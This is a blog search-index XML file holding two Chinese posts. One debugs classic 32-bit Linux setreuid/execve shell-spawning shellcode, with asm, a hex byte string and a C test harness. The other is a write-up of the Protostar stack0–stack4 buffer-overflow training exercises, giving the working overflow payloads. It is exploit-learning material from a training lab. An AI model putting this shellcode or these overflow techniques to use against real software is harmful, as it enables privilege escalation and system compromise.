<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Debug Shellcode]]></title>
    <url>%2F2017%2F09%2F05%2FDebug-Shellcode%2F</url>
    <content type="text"><![CDATA[记录几个自己碰到的关于shellcode的问题, 一个都没解决…如果有知道解决方法的请发我邮箱(邮箱在页面最下方), 谢谢! shellcode 1最简单的shellcode形式大概就是直接调用execve(“/bin/sh”, {“/bin/sh”, NULL}, NULL)系统调用了吧…并不是十分清楚, 所以如果说错的话就当我没说… C code先从C代码开始: 123456#include &lt;stdlib.h&gt;main()&#123; char *argv[] = &#123;"bin/sh", NULL&#125;; setuid(0, 0); execve("/bin/sh", argv, NULL);&#125; 编译运行以上程序, 我们就能够得到一个shell了. asm code 按照上面的思路, 转成汇编代码: 123456789101112131415161718192021section .textglobal _start_start: ;setreuid(0, 0) xor eax, eax xor ebx, ebx ;ruid = 0 xor ecx, ecx ;euid = 0 mov al,0x46 ;sys_setreuid int 0x80 ;execve(&quot;/bin//sh&quot;, argv, NULL) xor eax, eax push eax ;NULL, 字符串截断符 ;&quot;//sh&quot;, 第二个&apos;/&apos;是为了填充字节, 在命令行输入/bin//sh是可以执行成功的 push 0x68732f2f push 0x6e69622f ;&quot;/bin&quot; mov ebx, esp push eax ;NULL, 设置argv[1]为空 push ebx mov ecx, esp mov al, 0x0b ;sys_execve int 0x80 具体栈内数据如下:1234567891011low--&gt; ++++++++++++++ + argv + &lt;-- argv = sh_addr(addr of &apos;/bin//sh&apos;) ++++++++++++++ + 0 + &lt;-- argv [1]sh_addr ++++++++++++++ + /bin + ++++++++++++++ + //sh + ++++++++++++++ + 0 +high--&gt; ++++++++++++++ 编译运行以后就能够成功拿到shell了, 然后用objdump反汇编, 就可以得到shellcode. 这段代码出自《Grey Hat Hacking》一书, 我尝试着想把它改成下面的形式, 但是程序报错Address boundary error. 后面发现原因: argv是一个指针数组, 如果要把它写到.data段中, 就需要知道argv在data中的具体地址. 这种做法是不可取的, 因为.data段的地址不是固定的. 但是, 如果要想用这种db &quot;/bin/sh&quot;形式, 也还是办法的. 具体见下面的shellcode2. 12section .datashell db &apos;/bin//sh&apos;, 0 shellcode test&amp;debug一种常见的测试shellcode是否可用的方法是: 12345678910111213141516171819202122/*char sc[] = your_shellcode;*/char sc[] = "\x31\xc0" //xor eax,eax "\x31\xdb" //xor ebx,ebx "\x31\xc9" //xor ecx,ecx "\xb0\x46" //mov al,0x46 "\xcd\x80" //int 0x80 "\x31\xc0" //xor eax,eax "\x50" //push eax "\x68\x2f\x2f\x73\x68" //push 0x68732f2f "\x68\x2f\x62\x69\x6e" //push 0x6e69622f "\x89\xe3" //mov ebx,esp "\x50" //push eax "\x53" //push ebx "\x89\xe1" //mov ecx,esp "\xb0\x0b" //mov al,0xb "\xcd\x80" //int 0x80main()&#123; void (*fp)(void); fp = (void *) sc; fp();&#125; 用以上的方法对上述shellcode测试, 发现报SIGSEGV(Address boundary error)的错……用gdb调试, 发现了这样的结果, 一路下来程序执行的非常顺利, 栈上的数据也没有什么问题, 但是调用最后一个0x80的时候并没有getshell, 继续单步执行反而报了segment fault的错. 我是在protostar虚拟机里面测试的这段shellcode, 在ubuntu下好像被什么神秘的保护机制给挡住了…连shellcode起始地址都不跳进去就报错…好了, 虽然没有调试成功这段shellcode, 但就当作我已经测试成功了…接下来继续看下一段shellcode. shellcode2这段shellcode的原出处在Here. 它的设计思路和shellcode1一样. asm code1234567891011121314151617181920212223242526;shellex.asm[SECTION .text]global _start_start: xor eax, eax mov al, 70 ;setreuid is syscall 70 xor ebx, ebx xor ecx, ecx int 0x80 jmp short ender starter: pop ebx ;get the address of the string xor eax, eax mov [ebx+7], al ;put a NULL where the N is in the string mov [ebx+8], ebx ;put the address of the string to where the ;AAAA is mov [ebx+12], eax ;put 4 null bytes into where the BBBB is mov al, 11 ;execve is syscall 11 lea ecx, [ebx+8] ;load the address of where the AAAA was lea edx, [ebx+12] ;load the address of the NULLS int 0x80 ;call the kernel, WE HAVE A SHELL! ender: call starter db &apos;/bin/shNAAAABBBB&apos; 整个代码的逻辑感觉没有什么问题, 但是依然报错, 而且这次是运行可执行文件的时候就报错.报错情况如下: 可以看到程序是没有开任何保护机制的, 不知道又是哪股神秘的力量阻挡了shellcode的执行… summary可能是因为我给的两段shellcode的例子都比较老了, 所以问题才这么多吧. 不过我的确是在做PWN题目时候碰到过已经JMP进shellcode, 还报Segment Fault的错(那段shellcode是用gef工具生成的). 感觉shellcode真是一个神秘的东西. refrence 《Grey hat hacking》 Shellcoding for Linux and Windows Tutorial]]></content>
      <categories>
        <category>RE note</category>
      </categories>
      <tags>
        <tag>shellcode</tag>
        <tag>pwn</tag>
        <tag>gdb</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Protostar Stack Easy]]></title>
    <url>%2F2017%2F09%2F04%2Fprotostar-stack-easy%2F</url>
    <content type="text"><![CDATA[这是给exploit-exercises上protostar的stack题目写的write-up. 由于篇幅限制, 这篇文章只有stack0 - stack4的write-up. stack0首先看一下汇编代码 : 123456789101112131415161718192021222324(gdb) disas mainDump of assembler code for function main:0x080483f4 &lt;main+0&gt;: push ebp0x080483f5 &lt;main+1&gt;: mov ebp,esp0x080483f7 &lt;main+3&gt;: and esp,0xfffffff00x080483fa &lt;main+6&gt;: sub esp,0x60;first pramater modified0x080483fd &lt;main+9&gt;: mov DWORD PTR [esp+0x5c],0x00x08048405 &lt;main+17&gt;: lea eax,[esp+0x1c] ;buf0x08048409 &lt;main+21&gt;: mov DWORD PTR [esp],eax0x0804840c &lt;main+24&gt;: call 0x804830c &lt;gets@plt&gt; ;gets(buf)0x08048411 &lt;main+29&gt;: mov eax,DWORD PTR [esp+0x5c]0x08048415 &lt;main+33&gt;: test eax,eax ;if (flag == 0)?0x08048417 &lt;main+35&gt;: je 0x8048427 &lt;main+51&gt;;puts($0x8048500) if (modified != 0)0x08048419 &lt;main+37&gt;: mov DWORD PTR [esp],0x80485000x08048420 &lt;main+44&gt;: call 0x804832c &lt;puts@plt&gt; 0x08048425 &lt;main+49&gt;: jmp 0x8048433 &lt;main+63&gt;;puts($0x8048500) if (modified == 0)0x08048427 &lt;main+51&gt;: mov DWORD PTR [esp],0x80485290x0804842e &lt;main+58&gt;: call 0x804832c &lt;puts@plt&gt;0x08048433 &lt;main+63&gt;: leave 0x08048434 &lt;main+64&gt;: ret End of assembler dump. 上述代码中, 注释为笔者所加. 下面看一下0x8048500和0x8048529两个字符串的具体内容: 1234(gdb) x/s 0x80485000x8048500: &quot;you have changed the &apos;modified&apos; variable&quot;(gdb) x/s 0x80485290x8048529: &quot;Try again?&quot; 到此, 这个程序的逻辑就已经理清了. 该程序调用gets()函数读取用户输入, 并写入到buf[0x40]中. 由于程序不检查输入, 此处可以发生字符串溢出. 当modified值被修改后输出”you have changed the ‘modified’ variable”, 否则输出”Try again?”. stack0程序的源代码在Here. 我们只要输入超过0x40个字符就能够获取到正确输入. solve1python -c "print 'A'*0x40 + 'modified'" | ./stack0 stack1照样先看汇编代码: 123456789101112131415161718192021222324252627282930313233343536373839404142(gdb) disas mainDump of assembler code for function main:;modified = [esp+0x5c] ;size=0x4;buf = [esp+0x1c] ;size=0x40;argv1 = [esp+0x4]0x08048464 &lt;main+0&gt;: push ebp0x08048465 &lt;main+1&gt;: mov ebp,esp0x08048467 &lt;main+3&gt;: and esp,0xfffffff00x0804846a &lt;main+6&gt;: sub esp,0x60;if argc == 1?0x0804846d &lt;main+9&gt;: cmp DWORD PTR [ebp+0x8],0x10x08048471 &lt;main+13&gt;: jne 0x8048487 &lt;main+35&gt;;call errx(1, $0x80485a0) if (argc == 1)0x08048473 &lt;main+15&gt;: mov DWORD PTR [esp+0x4],0x80485a00x0804847b &lt;main+23&gt;: mov DWORD PTR [esp],0x10x08048482 &lt;main+30&gt;: call 0x8048388 &lt;errx@plt&gt;0x08048487 &lt;main+35&gt;: mov DWORD PTR [esp+0x5c],0x0;argv1 = &amp;argv[1], strcpy(buf, argv1)0x0804848f &lt;main+43&gt;: mov eax,DWORD PTR [ebp+0xc]0x08048492 &lt;main+46&gt;: add eax,0x40x08048495 &lt;main+49&gt;: mov eax,DWORD PTR [eax]0x08048497 &lt;main+51&gt;: mov DWORD PTR [esp+0x4],eax0x0804849b &lt;main+55&gt;: lea eax,[esp+0x1c]0x0804849f &lt;main+59&gt;: mov DWORD PTR [esp],eax0x080484a2 &lt;main+62&gt;: call 0x8048368 &lt;strcpy@plt&gt;;if (modified == &apos;abcd&apos;)?0x080484a7 &lt;main+67&gt;: mov eax,DWORD PTR [esp+0x5c]0x080484ab &lt;main+71&gt;: cmp eax,0x616263640x080484b0 &lt;main+76&gt;: jne 0x80484c0 &lt;main+92&gt;;puts($0x80485bc) and leave if (modified == &apos;abcd&apos;)0x080484b2 &lt;main+78&gt;: mov DWORD PTR [esp],0x80485bc0x080484b9 &lt;main+85&gt;: call 0x8048398 &lt;puts@plt&gt;0x080484be &lt;main+90&gt;: jmp 0x80484d5 &lt;main+113&gt;;printf($0x80485f3, argv1) if (modified != &apos;abcd&apos;)0x080484c0 &lt;main+92&gt;: mov edx,DWORD PTR [esp+0x5c]0x080484c4 &lt;main+96&gt;: mov eax,0x80485f30x080484c9 &lt;main+101&gt;: mov DWORD PTR [esp+0x4],edx0x080484cd &lt;main+105&gt;: mov DWORD PTR [esp],eax0x080484d0 &lt;main+108&gt;: call 0x8048378 &lt;printf@plt&gt;0x080484d5 &lt;main+113&gt;: leave 0x080484d6 &lt;main+114&gt;: ret End of assembler dump. 继续看一下各个字符串的值分别为多少: 123456(gdb) x/s 0x80485f30x80485f3: &quot;Try again, you got 0x%08x\n&quot;(gdb) x/s 0x80485bc0x80485bc: &quot;you have correctly got the variable to the right value&quot;(gdb) x/s 0x80485a00x80485a0: &quot;please specify an argument\n&quot; 该程序首先检查argc是否为1, 若是, 则程序报错. 然后执行strcpy(buf, argv[1]), 如果modified被覆写为”abcd”, 则输出you have correctly got the variable to the right value, 否则视为失败. stack1的源码在Here. solve1python -c "print 'A'*0x40 + 'abcd'" | ./stack1 stack2执行程序,得到以下结果: 1234root@protostar:/opt/protostar/bin# ./stack2stack2: please set the GREENIE environment variableroot@protostar:/opt/protostar/bin# 可以看到, 这个程序要求我们设置GREENIE的环境变量. 那么在这里, 我们就需要用到execve()系统调用, 这道题的exp可以用python写, 也可以用C写, 我用的是python. 其实用C和python代码基本相同, 除了在C中环境变量是由”$ENV_NAME=ENV_VALUE”的指针数组表示, 而在python里, 环境变量的类型是字典. 继续上汇编代码: 123456789101112131415161718192021222324252627282930313233343536373839404142434445(gdb) disas mainDump of assembler code for function main:;env_greenie = [esp+0x5c] ;size = 0x4;modified = [esp+0x58] ;size = 0x4;buf = [esp+0x18] ;size = 0x400x08048494 &lt;main+0&gt;: push ebp0x08048495 &lt;main+1&gt;: mov ebp,esp0x08048497 &lt;main+3&gt;: and esp,0xfffffff00x0804849a &lt;main+6&gt;: sub esp,0x60;env_greenie = getenv(&quot;GREENIE&quot;)0x0804849d &lt;main+9&gt;: mov DWORD PTR [esp],0x80485e00x080484a4 &lt;main+16&gt;: call 0x804837c &lt;getenv@plt&gt;0x080484a9 &lt;main+21&gt;: mov DWORD PTR [esp+0x5c],eax;if (env_greenie == 0)?0x080484ad &lt;main+25&gt;: cmp DWORD PTR [esp+0x5c],0x00x080484b2 &lt;main+30&gt;: jne 0x80484c8 &lt;main+52&gt;;errx(1, &quot;GREENIE&quot;) if (env_greenie == 0)0x080484b4 &lt;main+32&gt;: mov DWORD PTR [esp+0x4],0x80485e80x080484bc &lt;main+40&gt;: mov DWORD PTR [esp],0x10x080484c3 &lt;main+47&gt;: call 0x80483bc &lt;errx@plt&gt;;if (env_greenie != 0)&#123;0x080484c8 &lt;main+52&gt;: mov DWORD PTR [esp+0x58],0x0 ;modified = 0;strcpy(buf, env_greenie) &#125;0x080484d0 &lt;main+60&gt;: mov eax,DWORD PTR [esp+0x5c]0x080484d4 &lt;main+64&gt;: mov DWORD PTR [esp+0x4],eax0x080484d8 &lt;main+68&gt;: lea eax,[esp+0x18]0x080484dc &lt;main+72&gt;: mov DWORD PTR [esp],eax0x080484df &lt;main+75&gt;: call 0x804839c &lt;strcpy@plt&gt;;if (modified = 0x8048618)?0x080484e4 &lt;main+80&gt;: mov eax,DWORD PTR [esp+0x58]0x080484e8 &lt;main+84&gt;: cmp eax,0xd0a0d0a0x080484ed &lt;main+89&gt;: jne 0x80484fd &lt;main+105&gt;;puts($0x8048618) and leave if (modified == 0xd0a0d0a)0x080484ef &lt;main+91&gt;: mov DWORD PTR [esp],0x80486180x080484f6 &lt;main+98&gt;: call 0x80483cc &lt;puts@plt&gt;0x080484fb &lt;main+103&gt;: jmp 0x8048512 &lt;main+126&gt;;printf($0x8048641, midified) if (modified != 0xd0a0d0a)0x080484fd &lt;main+105&gt;: mov edx,DWORD PTR [esp+0x58]0x08048501 &lt;main+109&gt;: mov eax,0x80486410x08048506 &lt;main+114&gt;: mov DWORD PTR [esp+0x4],edx0x0804850a &lt;main+118&gt;: mov DWORD PTR [esp],eax0x0804850d &lt;main+121&gt;: call 0x80483ac &lt;printf@plt&gt;0x08048512 &lt;main+126&gt;: leave 0x08048513 &lt;main+127&gt;: ret End of assembler dump. ​ 各个字符串的值分别如下: 123450x80485e0: &quot;GREENIE&quot;(gdb) x/s0x80485e8: &quot;please set the GREENIE environment variable\n&quot;(gdb) x/s 0x80486180x8048618: &quot;you have correctly modified the variable&quot; ​ 整个程序的流程就是调用strcpy将env_greenie的值复制给buf, 如果midified的值被覆盖, 则输出”you have correctly modified the variable”, 否则视为失败. ​ stack2的源码在Here. solve.py​ 下面是用python写的exp, 由于小端的存取顺序0x0d0a0d0a需要倒过来写: 1234import osenv_greenie = 'A'*0x40 + '\x0a\x0d\x0a\x0d'envp = &#123;"GREENIE": str(env_greenie)&#125;os.execve("./stack2", ["./stack2"], envp) stack3还是先上汇编代码, 下面这段是main函数的汇编代码: 123456789101112131415161718192021222324252627282930(gdb) disas mainDump of assembler code for function main:;midified = [esp+0x5c];buf = [esp+0x1c]0x08048438 &lt;main+0&gt;: push ebp0x08048439 &lt;main+1&gt;: mov ebp,esp0x0804843b &lt;main+3&gt;: and esp,0xfffffff00x0804843e &lt;main+6&gt;: sub esp,0x600x08048441 &lt;main+9&gt;: mov DWORD PTR [esp+0x5c],0x0 ;midified = 0;gets(buf)0x08048449 &lt;main+17&gt;: lea eax,[esp+0x1c]0x0804844d &lt;main+21&gt;: mov DWORD PTR [esp],eax0x08048450 &lt;main+24&gt;: call 0x8048330 &lt;gets@plt&gt;;if (modified == 0)?0x08048455 &lt;main+29&gt;: cmp DWORD PTR [esp+0x5c],0x0;leave if if (modified == 0)0x0804845a &lt;main+34&gt;: je 0x8048477 &lt;main+63&gt;;if (modified != 0)&#123;;printf($0x8048560, midified)0x0804845c &lt;main+36&gt;: mov eax,0x80485600x08048461 &lt;main+41&gt;: mov edx,DWORD PTR [esp+0x5c]0x08048465 &lt;main+45&gt;: mov DWORD PTR [esp+0x4],edx0x08048469 &lt;main+49&gt;: mov DWORD PTR [esp],eax0x0804846c &lt;main+52&gt;: call 0x8048350 &lt;printf@plt&gt;;call(modified) &#125;0x08048471 &lt;main+57&gt;: mov eax,DWORD PTR [esp+0x5c]0x08048475 &lt;main+61&gt;: call eax0x08048477 &lt;main+63&gt;: leave 0x08048478 &lt;main+64&gt;: ret End of assembler dump. 字符串的值如下: 12(gdb) x/s 0x80485600x8048560: &quot;calling function pointer, jumping to 0x%08x\n&quot; 可以看到, 若modified被覆盖, 函数将跳转midified, 我们只要把modified覆盖成我们想要跳转的地址即可. 查看程序的C源码, 可以看到源码中定义了一个win()函数. 12(gdb) info addr winSymbol &quot;win&quot; is a function at address 0x8048424. 所以0x8048424就是我们要跳转的地址. stack2的源码在Here. solve1python -c "print 'A'*0x40 + '\x24\x84\x04\x08'" | ./stack3 stack4这道题的代码有点短, 代码如下: 12345678910111213Dump of assembler code for function main:;buf = [esp+0x10] ;size = 0x400x08048408 &lt;main+0&gt;: push ebp0x08048409 &lt;main+1&gt;: mov ebp,esp0x0804840b &lt;main+3&gt;: and esp,0xfffffff00x0804840e &lt;main+6&gt;: sub esp,0x50;gets(buf)0x08048411 &lt;main+9&gt;: lea eax,[esp+0x10]0x08048415 &lt;main+13&gt;: mov DWORD PTR [esp],eax0x08048418 &lt;main+16&gt;: call 0x804830c &lt;gets@plt&gt;0x0804841d &lt;main+21&gt;: leave 0x0804841e &lt;main+22&gt;: ret End of assembler dump. 该程序调用gets函数读取用户输入, 然后退出. 我们可以覆写函数的返回地址, 让函数返回到win函数的入口地址. 用gdb查看win函数的地址为0x80483f4, 调试程序, 查看buf的地址离要覆盖的地址之间的偏移. buf的起始地址在$esp+0x10 == 0xbffffc50. retaddr的地址为$ebp+0x4 == 0xbffffc9c, 偏移为0x4c. 1234(gdb) x/x $esp+0x100xbffffc50: 0xb7fd7ff4(gdb) x/x $ebp+0x40xbffffc9c: 0xb7eadc76 solve1python -c "print 'A'*0x4c + '\xf4\x83\x04\x08'" | ./stack4 运行上面这行命令以后, 我们会得到”code flow successfully changed”的输出和一个Segmentation fault的提示, 这是正常的, 因为我们覆盖了main函数的返回地址使得程序无法正常退出了. summary以上的五道题目都是非常简单的栈溢出题, 程序没有设置任何保护机制, 也不需要用到什么技巧就能够破解. 有一点要注明的是, 上面的代码块中有些语法为shell的代码块我写了python, 因为Hexo默认不支持shell, 也不支持汇编…]]></content>
      <categories>
        <category>write-up</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>stack overflow</tag>
      </tags>
  </entry>
</search>
